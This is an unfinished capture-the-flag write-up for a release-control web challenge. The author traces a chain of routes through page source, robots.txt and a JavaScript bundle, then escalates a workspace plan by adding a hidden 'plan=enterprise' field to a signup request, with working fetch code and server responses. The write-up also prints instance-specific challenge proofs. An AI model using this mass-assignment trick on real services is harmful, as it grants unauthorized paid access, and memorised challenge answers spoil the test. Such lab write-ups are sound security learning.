# Velora (Web, 900 points)

> **Work in progress.** I reached layer 4 and confirmed that a signup request with `plan=enterprise` changes the workspace plan. Layer 5 now requires an operator member settings page to have been read. The flag is still pending.

## Challenge

Velora is a release-control web application. The challenge asks us to follow an ordered HTTP chain, sending the proof from each completed layer in the `X-Chain` header, until a settlement record is written and returned. The flag format is `CSCTF{...}`.

## Approach

I followed the breadcrumbs exposed by the site and used the browser's developer tools to request each route. The layer 1 response explained that proofs must be joined with `|` in the `X-Chain` header. I used the route and proof values from the same running instance.

## Solution

### Layers 1–3

The landing page source disclosed a `channel` route. Its response returned layer 1 and pointed to crawler rules. `robots.txt` exposed a `budget` route, which returned layer 2 and pointed to the console bundle. The JavaScript bundle exposed a `map` route, which returned layer 3 and gave the next route.

The route and proof values I observed in this run were:

| Layer | Evidence | Route or proof |
| --- | --- | --- |
| 1 | `channel` route response | `0ee13ab0b060ed01691767f27a263089` |
| 2 | `budget` route response | `fd1ea35199893eac8e4c2c979b1e8b15` |
| 3 | `map` route response | `ff7381ca378a2d643581a5692f8a98d7` |
| 4 | Returned by layer 3 as `next` | `/x/c1c715394fb393f5` |

These values are from one attempt and should not be reused after the instance or session changes.

Example request shape used in the browser console:

```javascript
fetch('/x/<route-from-previous-response>', {
  credentials: 'same-origin',
  headers: {
    'X-Chain': '<layer-1-proof>|<layer-2-proof>|<layer-3-proof>'
  }
})
```

[screenshot: layer 1 response]

[screenshot: robots.txt breadcrumb and layer 2 response]

[screenshot: JavaScript breadcrumb and layer 3 response]

### Layer 4: plan gate and signup parameter

Requesting the route returned by layer 3 with the three proofs produced:

```json
{"ok": false, "layer": 4, "error": "This workspace is not on a plan that includes operator tools."}
```

The first request was denied because the workspace plan did not include operator tools. I then sent a signup request with an extra `plan=enterprise` field. The browser followed the redirect and reported HTTP 200 at `/desk`:

```javascript
fetch("/signup", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: new URLSearchParams({
    name: "lab",
    email: "lab@ctf.lab",
    password: "password123",
    plan: "enterprise"
  })
}).then(r => console.log(r.status, r.url))
```

I then retried the layer 4 route with the chain proofs. This time it succeeded:

```json
{"ok": true, "layer": 4, "proof": "53660b9ae4783d1fb63f8a8048fed850", "note": "Plan updated.", "next": "/x/fffa4353e1eb64c0"}
```

This confirms that the backend accepted the extra signup field and updated the plan for this session. The route and proof values are temporary and should not be reused after the session or instance changes.

### Layer 5: operator member settings (in progress)

Using the layer 5 route returned by layer 4 and all four proofs, the server responded:

```json
{"ok": false, "layer": 5, "error": "Operator member settings have not been read."}
```

This shows that the plan gate is passed, but layer 5 also requires a member-settings resource to be read. I have not identified that resource yet.

I checked the landing page, desk, console, dashboard, and JavaScript bundle for member/settings/operator clues. The landing page describes members and operators, but the desk and bundle had no matching text. `/console` returned HTTP 403 with “Operator role required,” and `/dashboard` returned HTTP 403. Neither response identified the required settings page.

[screenshot: layer 5 response requesting operator member settings]

[screenshot: layer 4 plan-gate response]

## Dead ends

Before testing the signup field, I tried the demo request and explored the desk exports and operator-facing pages. Those attempts did not get past the layer 4 plan gate.

## Flag

Pending. The chain has succeeded through layer 4; layer 5 onward is unfinished.

## Takeaway

I learned to follow the exposed route chain and carry its proofs in order. The signup endpoint accepted a plan field that was absent from the visible form, changing the layer 4 result from an entitlement error to `Plan updated`; layer 5 checks for an additional member-settings read.
